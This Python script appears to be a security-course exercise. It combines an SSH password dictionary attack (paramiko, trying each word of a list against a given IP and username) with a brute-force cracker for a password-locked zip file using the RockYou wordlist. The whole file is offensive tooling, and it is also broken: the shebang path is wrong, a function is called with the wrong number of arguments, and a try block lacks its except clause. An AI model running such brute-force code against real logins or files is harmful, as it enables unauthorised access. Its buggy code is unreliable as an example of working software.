#!/bin/usr/python3

# Script Name:                      401 ops challenge 18
# Author:                           Ethan Pham
# Date of latest revision:          May 22, 2024
# Purpose:                          Add the capability to brute force attack a password-locked zip file

import time
import paramiko
import zipfile

def offensive_mode(file_path, delay, ip_address, username):
    try:
        with open(file_path, 'r') as file:
            words = file.readlines()

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for word in words:
            password = word.strip()
            print(f"Trying {password}")
            try:
                ssh.connect(ip_address, username=username, password=password)
                print("Login successful")
                return True
            except paramiko.AuthenticationException:
                print("Login failed")
                time.sleep(1)

        print("Password not found")
        return False
    except FileNotFoundError:
        print("The file was not found")

def defensive_mode(file_path, search_string):
    try:
        with open(file_path, 'r') as file:
            words = file.readlines()
        found = any(word.strip() == search_string for word in words)
        if found:
            print(f"'{search_string}' was found")
        else:
            print(f"'{search_string}' was not found")
    except FileNotFoundError:
        print("The file was not found")

def brute_force_zip(zip_file_path, wordlist_path):
    try:
        with open(wordlist_path, 'r') as file:
            passwords = file.readlines()

        zip_file = zipfile.ZipFile(zip_file_path)

        for password in passwords:
            password = password.strip().encode('utf-8')
            try:
                zip_file.extractall(pwd=password)
                print(f"Password found: {password.decode('utf-8')}")
                return True
            except (RuntimeError, zipfile.BadZipFile, zipfile.LargeZipFile):
                print(f"Password failed")
        print("Password not found")
        return False

def main():
    while True:
        print("Choose a mode:")
        print("1: Offensive; Dictionary Iterator")
        print("2: Defensive; Password Recognized")
        print("3: Brute Force ZIP File")
        mode = input("Enter mode number: ")

        if mode == '1':
            file_path = input("Enter word list file path: ")
            ip_address = input("IP address: ")
            username = input("Username: ")
            offensive_mode(file_path, ip_address, username)
        elif mode == '2':
            search_string = input("Enter string to search: ")
            file_path = input("Enter word list file path: ")
            defensive_mode(file_path, search_string)
        elif mode == '3':
            zip_file_path = "legos1.zip"
            wordlist_path = "RockYou.txt"
            brute_force_zip(zip_file_path, wordlist_path)
        
        break

if __name__ == "__main__":
    main()